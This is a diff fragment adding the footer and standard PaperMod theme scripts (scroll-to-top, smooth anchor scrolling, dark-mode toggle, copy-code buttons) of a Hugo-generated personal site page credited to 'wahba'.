+        <span>&copy; 2025 <a href="http://localhost:1313/">wahba</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
